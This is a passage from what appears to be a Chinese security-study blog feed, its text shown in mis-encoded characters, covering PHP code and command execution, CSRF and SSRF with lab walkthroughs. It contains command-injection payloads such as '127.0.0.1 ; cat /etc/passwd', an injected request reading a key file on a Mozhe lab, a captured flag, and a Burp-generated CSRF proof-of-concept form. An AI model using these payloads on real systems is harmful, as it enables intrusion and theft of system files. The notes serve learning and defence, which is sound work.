        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨ Web åº”ç”¨ä¸­æœ‰æ—¶å€™ç¨‹åºå‘˜ä¸ºäº†è€ƒè™‘çµæ´»æ€§ã€ç®€æ´æ€§ï¼Œä¼šåœ¨ä»£ç è°ƒç”¨ ä»£ç æˆ–å‘½ä»¤æ‰§è¡Œå‡½æ•°å»å¤„ç†ã€‚æ¯”å¦‚å½“åº”ç”¨åœ¨è°ƒç”¨ä¸€äº›èƒ½å°†å­—ç¬¦ä¸²è½¬åŒ–æˆä»£ ç çš„å‡½æ•°æ—¶ï¼Œæ²¡æœ‰è€ƒè™‘ç”¨æˆ·æ˜¯å¦èƒ½æ§åˆ¶è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå°†é€ æˆä»£ç æ‰§è¡Œæ¼ æ´ã€‚åŒæ ·è°ƒç”¨ç³»ç»Ÿå‘½ä»¤å¤„ç†ï¼Œå°†é€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="ä»£ç æ‰§è¡Œ-RCE-æ¼æ´"><a href="#ä»£ç æ‰§è¡Œ-RCE-æ¼æ´" class="headerlink" title="ä»£ç æ‰§è¡Œ RCE æ¼æ´"></a>ä»£ç æ‰§è¡Œ RCE æ¼æ´</h3><h4 id="å½¢æˆ"><a href="#å½¢æˆ" class="headerlink" title="å½¢æˆ"></a>å½¢æˆ</h4><ul><li>å¯æ§å˜é‡</li><li>æ¼æ´å‡½æ•°</li></ul><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„æ•°æ®å½“åšä»£ç æ¥æ‰§è¡Œï¼Œå¦‚æœæˆ‘ä»¬å½“å‰çš„ç½‘ç«™æ˜¯PHPå°±å½“åšPHPè¯­è¨€æ¥æ‰§è¡Œã€‚</p><h4 id="æ£€æµ‹"><a href="#æ£€æµ‹" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h4><p><strong>ç™½ç›’</strong></p><ul><li>ä»£ç å®¡è®¡</li></ul><p><strong>é»‘ç›’</strong></p><ul><li>æ¼æ‰«å·¥å…·</li><li>å…¬å¼€æ¼æ´</li><li>æ‰‹å·¥çœ‹å‚æ•°å€¼åŠåŠŸèƒ½ç‚¹</li></ul><h4 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br></pre></td></tr></table></figure><p>å°†è¾“å…¥çš„å­—ç¬¦ä¸²å½“åšPHPä»£ç æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert()</span><br></pre></td></tr></table></figure><p>ä¼šæ£€æŸ¥æŒ‡å®šçš„ assertion å¹¶åœ¨ç»“æœä¸º FALSE æ—¶é‡‡å–é€‚å½“çš„è¡ŒåŠ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()</span><br></pre></td></tr></table></figure><p>æŠŠç¬¬ä¸€å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array()</span><br></pre></td></tr></table></figure><p>è°ƒç”¨å›åˆ°å‡½æ•°,å¹¶æŠŠç¬¬ä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›åˆ°å‡½æ•°çš„å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map()</span><br></pre></td></tr></table></figure><p>ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•°</p><h4 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h4><ul><li>æ•æ„Ÿå‡½æ•°ç¦ç”¨</li><li>å˜é‡è¿‡æ»¤æˆ–å›ºå®š</li><li>WAFäº§å“</li></ul><h4 id="æ¡ˆä¾‹æ¼”ç¤º"><a href="#æ¡ˆä¾‹æ¼”ç¤º" class="headerlink" title="æ¡ˆä¾‹æ¼”ç¤º"></a>æ¡ˆä¾‹æ¼”ç¤º</h4><p>è¿™é¢˜æ˜¯ä¸€ä¸ªç™½ç›’æµ‹è¯•ï¼Œéœ€è¦ä»£ç å®¡è®¡</p><p><img src="https://p.pstatp.com/origin/pgc-image/0c00ea242aa74405bb4f687222e06941"></p><p>è¯¥ä»£ç æ˜¯å°†ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œè§£å¯†ï¼Œç„¶åæ‰§è¡Œè„šæœ¬å‘½ä»¤</p><p><img src="https://p.pstatp.com/origin/pgc-image/0611a988ad1d4e4daabfbf11a4064d65"></p><p>è§£å¯†åå‘ç°æ˜¯æ¥æ”¶ä¸€ä¸ªaå‚æ•°</p><p>ç›´æ¥ä½¿ç”¨<code>?a=ls</code>æ‰§è¡Œå‘½ä»¤</p><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><h4 id="ç³»ç»Ÿ"><a href="#ç³»ç»Ÿ" class="headerlink" title="ç³»ç»Ÿ"></a>ç³»ç»Ÿ</h4><ul><li>linux</li><li>windows</li></ul><h4 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>åº”ç”¨åœ¨è°ƒç”¨è¿™äº›å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ—¶å€™ï¼Œå¦‚æœå°†ç”¨æˆ·çš„è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°æ‹¼æ¥åˆ°å‘½ä»¤è¡Œä¸­ï¼Œåœ¨æ²¡æœ‰è¿‡æ»¤ç”¨æˆ·çš„è¾“å…¥çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h4 id="å½¢æˆ-1"><a href="#å½¢æˆ-1" class="headerlink" title="å½¢æˆ"></a>å½¢æˆ</h4><ul><li>å¯æ§å˜é‡</li><li>æ¼æ´å‡½æ•°</li></ul><h4 id="å‘½ä»¤æ‹¼æ¥"><a href="#å‘½ä»¤æ‹¼æ¥" class="headerlink" title="å‘½ä»¤æ‹¼æ¥"></a>å‘½ä»¤æ‹¼æ¥</h4><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">A;B A ä¸è®ºæ­£ç¡®ä¸å¦éƒ½ä¼šæ‰§è¡Œ B</span><br><span class="line">A&amp;B A åå°è¿è¡Œï¼ŒA å’Œ B åŒæ—¶æ‰§è¡Œ</span><br><span class="line">A&amp;&amp;B A æ‰§è¡ŒæˆåŠŸæ—¶å€™æ‰ä¼šæ‰§è¡Œ B å‘½ä»¤</span><br><span class="line">A|B A æ‰§è¡Œçš„è¾“å‡ºç»“æœï¼Œä½œä¸º B å‘½ä»¤çš„å‚æ•°ï¼ŒA ä¸è®ºæ­£ç¡®ä¸å¦éƒ½ä¼šæ‰§è¡Œ B å‘½ä»¤</span><br><span class="line">A||B A æ‰§è¡Œå¤±è´¥åæ‰ä¼šæ‰§è¡Œ B å‘½ä»¤</span><br><span class="line">``    åå•å¼•å·linuxä¸‹ä¼šå½“åšå‘½ä»¤æ¥æ‰§è¡Œ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">127.0.0.1 ; cat /etc/passwd </span><br><span class="line">127.0.0.1 &amp; cat /etc/passwd </span><br><span class="line">127.0.0.1 &amp;&amp; cat /etc/passwd </span><br><span class="line">127.0.0.1 | cat /etc/passwd </span><br><span class="line">233 || cat /etc/passwd</span><br></pre></td></tr></table></figure><p>windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;|&quot;: ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</span><br><span class="line">&quot;||&quot;: å¦‚æœå‰é¢çš„è¯­å¥æ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡æ‰è¡Œã€‚</span><br><span class="line">&quot;&amp;&quot;ï¼šä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚</span><br><span class="line">&quot;&amp;&amp;&quot;ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§    è¡Œ,å‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</span><br></pre></td></tr></table></figure><h4 id="phpç›¸å…³å‡½æ•°"><a href="#phpç›¸å…³å‡½æ•°" class="headerlink" title="phpç›¸å…³å‡½æ•°"></a>phpç›¸å…³å‡½æ•°</h4><ul><li>system(args) æœ‰å›æ˜¾</li><li>passthru(args)(æœ‰å›æ˜¾)</li><li>exec(args) ï¼ˆå›æ˜¾æœ€åä¸€è¡Œ-å¿…é¡»echoè¾“å‡ºï¼‰</li><li>shell_exec(args) ï¼ˆæ— å›æ˜¾-å¿…é¡»è¾“å‡ºï¼‰</li><li>åå¼•å·ï¼š``</li><li>popen(handle,mode)(æ— å›æ˜¾)</li><li>proc_open(â€˜cmdâ€™,â€˜flagâ€™,â€˜flagâ€™)ï¼ˆæ— å›æ˜¾ï¼‰</li><li>$process = proc_open(â€˜dirâ€™,$des,$pipes);</li><li>echo stream_get_contents($pipes[1]); </li></ul><h4 id="æ¡ˆä¾‹æ¼”ç¤º-1"><a href="#æ¡ˆä¾‹æ¼”ç¤º-1" class="headerlink" title="æ¡ˆä¾‹æ¼”ç¤º"></a>æ¡ˆä¾‹æ¼”ç¤º</h4><p>å¢¨è€…å‘½ä»¤æ³¨å…¥æ‰§è¡Œåˆ†æ</p><p>é€šè¿‡æŠ“åŒ…ç»•è¿‡å‰ç«¯jsæ£€æµ‹ã€‚ä½¿ç”¨<code>;</code>è¿›è¡Œå‘½ä»¤æ‹¼æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iipp=127.0.0.1;ls&amp;submit=Ping</span><br></pre></td></tr></table></figure><p><img src="https://p.pstatp.com/origin/pgc-image/75a742c9a3a1492d9df791080b8a3a83"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iipp=127.0.0.1;cat&lt;key_21071211676104.php&amp;submit=Ping</span><br></pre></td></tr></table></figure><p>æˆåŠŸè·å–flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mozhe1af4b8cc599a0a837919be1d30d</span><br></pre></td></tr></table></figure><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/ermei/p/6689005.html</span><br><span class="line"></span><br><span class="line">http://blog.leanote.com/post/snowming/9da184ef24bd</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3</span><br><span class="line">Sm13dz09bW96aGUmozhe</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGx</span><br><span class="line">aL0JjUT09bW96aGUmozhe</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDd</span><br><span class="line">Xl0Zz09bW96aGUmozhe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> ä»£ç æ‰§è¡Œ </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>29WEBæ¼æ´-CSRFåŠSSRFæ¼æ´æ¡ˆä¾‹è®²è§£</title>
      <link href="/2021/09/21/29WEB%E6%BC%8F%E6%B4%9E-CSRF%E5%8F%8ASSRF%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%AE%B2%E8%A7%A3/"/>
      <url>/2021/09/21/29WEB%E6%BC%8F%E6%B4%9E-CSRF%E5%8F%8ASSRF%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="CSRFæ¼æ´"><a href="#CSRFæ¼æ´" class="headerlink" title="CSRFæ¼æ´"></a>CSRFæ¼æ´</h3><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118725.png" alt="image-20210912103808280"></p><h4 id="ä»€ä¹ˆæ˜¯CSRF"><a href="#ä»€ä¹ˆæ˜¯CSRF" class="headerlink" title="ä»€ä¹ˆæ˜¯CSRF"></a>ä»€ä¹ˆæ˜¯CSRF</h4><p>CSRFï¼ˆCross-site request forgeryï¼‰ï¼Œä¸­æ–‡åç§°ï¼šè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä¹Ÿè¢«ç§°ä¸ºï¼šone click attack/session ridingï¼Œç¼©å†™ä¸ºï¼šCSRF/XSRFã€‚</p><h4 id="CSRFå¯ä»¥åšä»€ä¹ˆ"><a href="#CSRFå¯ä»¥åšä»€ä¹ˆ" class="headerlink" title="CSRFå¯ä»¥åšä»€ä¹ˆ"></a>CSRFå¯ä»¥åšä»€ä¹ˆ</h4><p>ä½ è¿™å¯ä»¥è¿™ä¹ˆç†è§£CSRFæ”»å‡»ï¼šæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚ã€‚CSRFèƒ½å¤Ÿåšçš„äº‹æƒ…åŒ…æ‹¬ï¼šä»¥ä½ åä¹‰å‘é€é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç›—å–ä½ çš„è´¦å·ï¼Œç”šè‡³äºè´­ä¹°å•†å“ï¼Œè™šæ‹Ÿè´§å¸è½¬è´¦â€¦â€¦é€ æˆçš„é—®é¢˜åŒ…æ‹¬ï¼šä¸ªäººéšç§æ³„éœ²ä»¥åŠè´¢äº§å®‰å…¨ã€‚</p><h4 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h4><p>ç”¨æˆ·ç™»å½•ä¸€ä¸ªæ­£å¸¸çš„ç½‘ç«™ï¼Œå¹¶ä¸”æœ¬åœ°ç”Ÿæˆäº†è‡ªå·±çš„Cookieï¼Œç„¶ååœ¨ä¸å…³é—­è¯¥ç½‘ç«™çš„å‰æä¸‹ï¼Œç”¨æˆ·è®¿é—®äº†é»‘å®¢çš„ç½‘ç«™ï¼Œé»‘å®¢é€šè¿‡ä¼ªé€ æ•°æ®åŒ…ï¼Œå‘æ­£å¸¸ç½‘ç«™å‘èµ·è¯·æ±‚ï¼Œä»è€Œé€ æˆäº†CSRFæ”»å‡»ã€‚</p><h4 id="æ¡ˆä¾‹æ¼”ç¤º"><a href="#æ¡ˆä¾‹æ¼”ç¤º" class="headerlink" title="æ¡ˆä¾‹æ¼”ç¤º"></a>æ¡ˆä¾‹æ¼”ç¤º</h4><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æŠ“å–åˆ°æ­£å¸¸æ•°æ®åŒ…</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118367.png" alt="image-20210912105403233"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&#x27;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=b232oy&amp;phonenum=aaaaaaa&amp;add=chain&amp;email=vince%40pikachu.com&amp;submit=submit&#x27;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å…¶ä»–æµè§ˆå™¨å‘é€ä¸Šè¿°ä»£ç ï¼Œéœ€è¦åœ¨å‰é¢åŠ ä¸ŠIPåœ°å€</p><p>è¿™é‡Œæˆ‘æ˜¯é€šè¿‡å°†ä»£ç å†™åˆ°htmlæ–‡æœ¬é‡Œï¼Œè®¿é—®htmlè§¦å‘ä»£ç </p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118797.png" alt="image-20210912112045072"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨burpè‡ªåŠ¨ç”Ÿæˆcsrfä»£ç </p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118748.png" alt="image-20210912112441333"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;boy&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;23232&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;chain&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;vince&amp;#64;pikachu&amp;#46;com&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°ä»£ç å†™åˆ°htmlæ–‡ä»¶ä¸­ï¼Œä¸€æ ·å¯ä»¥è§¦å‘CSRFæ¼æ´ã€‚</p><h4 id="CSRFé˜²å¾¡"><a href="#CSRFé˜²å¾¡" class="headerlink" title="CSRFé˜²å¾¡"></a>CSRFé˜²å¾¡</h4><p>1ã€å½“ç”¨æˆ·å‘é€é‡è¦çš„è¯·æ±‚æ—¶éœ€è¦è¾“å…¥åŸå§‹å¯†ç <br>2ã€è®¾ç½®éšæœº Token<br>3ã€æ£€éªŒ referer æ¥æºï¼Œè¯·æ±‚æ—¶åˆ¤æ–­è¯·æ±‚é“¾æ¥æ˜¯å¦ä¸ºå½“å‰ç®¡ç†å‘˜æ­£åœ¨ä½¿ç”¨çš„é¡µé¢ï¼ˆç®¡ç†å‘˜åœ¨ç¼–è¾‘æ–‡ç« ï¼Œ<br>      é»‘å®¢å‘æ¥æ¶æ„çš„ä¿®æ”¹å¯†ç é“¾æ¥ï¼Œå› ä¸ºä¿®æ”¹å¯†ç é¡µé¢ç®¡ç†å‘˜å¹¶æ²¡æœ‰åœ¨æ“ä½œï¼Œæ‰€ä»¥æ”»å‡»å¤±è´¥ï¼‰<br>4ã€è®¾ç½®éªŒè¯ç <br>5ã€é™åˆ¶è¯·æ±‚æ–¹å¼åªèƒ½ä¸º POST</p><p>å¦‚æœåœ¨æµ‹è¯•CSRFä¸­ï¼Œæ•°æ®åŒ…æœ‰tokenï¼Œä¸€èˆ¬æ˜¯æ²¡æœ‰è¯¥æ¼æ´çš„ã€‚</p><h3 id="SSRFæ¼æ´"><a href="#SSRFæ¼æ´" class="headerlink" title="SSRFæ¼æ´"></a>SSRFæ¼æ´</h3><h4 id="ä»€ä¹ˆæ˜¯SSRF"><a href="#ä»€ä¹ˆæ˜¯SSRF" class="headerlink" title="ä»€ä¹ˆæ˜¯SSRF"></a>ä»€ä¹ˆæ˜¯SSRF</h4><p>SSRF (Server-Side Request Forgery) å³æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼Œä»å­—é¢æ„æ€ä¸Šç†è§£å°±æ˜¯ä¼ªé€ ä¸€ä¸ªæœåŠ¡ç«¯è¯·æ±‚ï¼Œä¹Ÿå³æ˜¯è¯´æ”»å‡»è€…ä¼ªé€ æœåŠ¡ç«¯çš„è¯·æ±‚å‘èµ·æ”»å‡»ï¼Œæ”»å‡»è€…å€Ÿç”±æœåŠ¡ç«¯ä¸ºè·³æ¿æ¥æ”»å‡»ç›®æ ‡ç³»ç»Ÿã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118434.png" alt="image-20210912113701370"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118450.png" alt="image-20210912113959313"></p><h4 id="SSRFæ¼æ´å±å®³"><a href="#SSRFæ¼æ´å±å®³" class="headerlink" title="SSRFæ¼æ´å±å®³"></a>SSRFæ¼æ´å±å®³</h4><p>åˆ©ç”¨SSRFå¯ä»¥è¿›è¡Œå†…å¤–ç½‘çš„ç«¯å£å’ŒæœåŠ¡æ¢æµ‹ã€ä¸»æœºæœ¬åœ°æ•æ„Ÿæ•°æ®çš„è¯»å–ã€å†…å¤–ç½‘ä¸»æœºåº”ç”¨ç¨‹åºæ¼æ´çš„åˆ©ç”¨ç­‰ç­‰ã€‚</p><h4 id="æ¼æ´å­˜åœ¨"><a href="#æ¼æ´å­˜åœ¨" class="headerlink" title="æ¼æ´å­˜åœ¨"></a>æ¼æ´å­˜åœ¨</h4><p>å…·ä½“å¯èƒ½å‡ºç°SSRFçš„åœ°æ–¹ï¼š</p><p>1.ç¤¾äº¤åˆ†äº«åŠŸèƒ½ï¼šè·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º</p><p>2.è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ</p><p>3.åœ¨çº¿ç¿»è¯‘ï¼šç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹</p><p>4.å›¾ç‰‡åŠ è½½/ä¸‹è½½ï¼šä¾‹å¦‚å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„ç‚¹å‡»ä¸‹è½½å›¾ç‰‡åˆ°æœ¬åœ°ï¼›é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</p><p>5.å›¾ç‰‡/æ–‡ç« æ”¶è—åŠŸèƒ½ï¼šä¸»è¦ç½‘ç«™ä¼šå–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æ±‚ä¸€ä¸ªå¥½çš„ç”¨æˆ·ä½“éªŒ</p><p>6.äº‘æœåŠ¡å‚å•†ï¼šå®ƒä¼šè¿œç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜æ´»ç­‰ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æ•è·ç›¸åº”çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¿›è¡ŒSSRFæµ‹è¯•</p><p>7.ç½‘ç«™é‡‡é›†ï¼Œç½‘ç«™æŠ“å–çš„åœ°æ–¹ï¼šä¸€äº›ç½‘ç«™ä¼šé’ˆå¯¹ä½ è¾“å…¥çš„urlè¿›è¡Œä¸€äº›ä¿¡æ¯é‡‡é›†å·¥ä½œ</p><p>8.æ•°æ®åº“å†…ç½®åŠŸèƒ½ï¼šæ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•°</p><p>9.é‚®ä»¶ç³»ç»Ÿï¼šæ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€</p><p>10.ç¼–ç å¤„ç†, å±æ€§ä¿¡æ¯å¤„ç†ï¼Œæ–‡ä»¶å¤„ç†ï¼šæ¯”å¦‚ffpmgï¼ŒImageMagickï¼Œdocxï¼Œpdfï¼Œxmlå¤„ç†å™¨ç­‰</p><p>11.æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½ï¼šå¯ä»¥åˆ©ç”¨google è¯­æ³•åŠ ä¸Šè¿™äº›å…³é”®å­—å»å¯»æ‰¾SSRFæ¼æ´ï¼Œä¸€äº›çš„urlä¸­çš„å…³é”®å­—ï¼šshareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domainâ€¦â€¦</p><p>12.ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆupload from url å¦‚discuzï¼ï¼›import &amp; expost rss feed å¦‚web blogï¼›ä½¿ç”¨äº†xmlå¼•æ“å¯¹è±¡çš„åœ°æ–¹ å¦‚wordpress xmlrpc.phpï¼‰</p><h4 id="æœ¬åœ°ä¸Šä¼ "><a href="#æœ¬åœ°ä¸Šä¼ " class="headerlink" title="æœ¬åœ°ä¸Šä¼ "></a>æœ¬åœ°ä¸Šä¼ </h4><p>æœ¬åœ°ä¸Šä¼ å°±æ˜¯é€šè¿‡å°†è‡ªå·±æœ¬åœ°çš„èµ„æºä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Š</p><h4 id="è¿œç¨‹ä¸Šä¼ "><a href="#è¿œç¨‹ä¸Šä¼ " class="headerlink" title="è¿œç¨‹ä¸Šä¼ "></a>è¿œç¨‹ä¸Šä¼ </h4><p>è¿œç¨‹ä¸Šä¼ å°±æ˜¯é€šè¿‡è¿œç¨‹åœ°å€æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œå¯¹æ–¹éœ€è¦è¯·æ±‚è¿œç¨‹åœ°å€ã€‚</p><h4 id="SSRFåŸç†"><a href="#SSRFåŸç†" class="headerlink" title="SSRFåŸç†"></a>SSRFåŸç†</h4><p>SSRFå­˜åœ¨äºè¿œç¨‹ä¸Šä¼ æˆ–è€…è¿œç¨‹åŠ è½½çš„åœ°æ–¹ï¼ŒæœåŠ¡å™¨ä¼šå¯¹æˆ‘ä»¬çš„è¿œç¨‹åœ°å€è¿›è¡Œè¯·æ±‚ï¼Œå¦‚æœæˆ‘ä»¬å°†è¯¥æœåŠ¡å™¨çš„è¿œç¨‹è®¿é—®åœ°å€ä¿®æ”¹ä¸º<code>127.0.0.1:ç«¯å£</code>ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šå¯¹è‡ªå·±çš„ç«¯å£è¿›è¡Œæ¢æµ‹ã€‚</p><h4 id="å„ä¸ªåè®®è°ƒç”¨æ¢é’ˆ"><a href="#å„ä¸ªåè®®è°ƒç”¨æ¢é’ˆ" class="headerlink" title="å„ä¸ªåè®®è°ƒç”¨æ¢é’ˆ"></a>å„ä¸ªåè®®è°ƒç”¨æ¢é’ˆ</h4><figure class="highlight plaintext"><table><tr><td 